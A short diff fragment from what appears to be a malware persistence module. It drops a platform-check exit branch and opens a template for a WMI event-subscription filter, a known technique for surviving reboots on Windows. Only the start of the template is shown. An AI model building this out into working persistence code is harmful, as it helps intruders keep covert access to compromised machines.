@@ -28,8 +28,6 @@ with multiple methods to ensure redundancy
 # setup
 if util.is_compatible(platforms, __name__):
     util.imports(packages, globals())
-else:
-    sys.exit()
 
 # templates
 __Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
